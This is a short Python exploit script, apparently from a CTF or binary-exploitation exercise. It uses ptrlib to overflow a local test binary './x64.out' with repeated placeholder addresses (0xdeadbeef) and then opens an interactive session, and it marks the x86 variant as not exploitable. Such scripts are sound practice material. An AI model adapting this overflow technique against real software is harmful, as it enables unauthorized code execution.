from ptrlib import *
import sys

x86target = 0xdeadbeef
x64target = 0xffffffffdeadbeef

x86cmd = ['./x86.out']
x64cmd = ['./x64.out']

def x86pwn():
    logger.warn("Not exploitable")

def x64pwn():
    elf = ELF('./x64.out')
    p = Process(x64cmd)
    p.send(p64(x64target) * (0x100 // 8))
    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"[-] Usage: {sys.argv[0]} [x86|x64]")
    else:
        if sys.argv[1] == 'x86':
            x86pwn()
        elif sys.argv[1] == 'x64':
            x64pwn()
        else:
            print("[-] Set 'x86' or 'x64'")
